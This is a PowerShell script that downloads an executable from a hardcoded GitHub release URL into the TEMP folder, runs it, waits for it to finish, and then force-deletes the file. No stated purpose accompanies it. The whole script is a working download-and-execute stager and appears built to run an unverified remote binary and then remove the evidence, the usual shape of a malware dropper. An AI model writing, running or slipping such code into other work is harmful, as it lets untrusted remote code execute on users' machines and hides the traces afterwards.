$HardcodedUrl = "https://github.com/kagagagag/html/releases/download/test/test.exe"

try {
    $Uri = [System.Uri]$HardcodedUrl
    $FileNameFromUrl = $Uri.Segments[-1] # Get the last part of the path (the filename)
    if ([string]::IsNullOrWhiteSpace($FileNameFromUrl)) {
        # Fallback if segments parsing fails unexpectedly
        $FileNameFromUrl = "downloaded_file_$(Get-Random).tmp"
        Write-Warning "Could not determine filename from URL, using random name: $FileNameFromUrl"
    }
} catch {
    Write-Error "Invalid URL format: $HardcodedUrl - Cannot determine filename."
    exit 1 # Exit if URL is fundamentally broken
}

$downloadPath = Join-Path $env:TEMP $FileNameFromUrl

try {
    Write-Host "Attempting to download file from '$HardcodedUrl' to '$downloadPath'..."
    Invoke-WebRequest -Uri $HardcodedUrl -OutFile $downloadPath -UseBasicParsing -ErrorAction Stop
    Write-Host "Download successful."

    if (Test-Path $downloadPath) {
        Write-Host "Executing '$downloadPath'..."
        $process = Start-Process -FilePath $downloadPath -PassThru
        Write-Host "Execution started. Waiting for process ID $($process.Id) to exit..."
        $process.WaitForExit()
        Write-Host "Process exited."
    } else {
        Write-Error "Downloaded file not found at '$downloadPath'. Cannot execute."
        return
    }

} catch {
    Write-Error "An error occurred: $($_.Exception.Message)"
} finally {
    if (Test-Path $downloadPath) {
        try {
            Remove-Item -Path $downloadPath -Force -ErrorAction Stop
            Write-Host "'$downloadPath' deleted successfully."
        } catch {
            Write-Error "Failed to delete '$downloadPath': $($_.Exception.Message)"
            Write-Warning "You may need to delete the file manually from '$env:TEMP'."
        }
    } else {
        Write-Host "'$downloadPath' not found for deletion (may not have downloaded or already deleted)."
    }
}

Write-Host "Script finished."
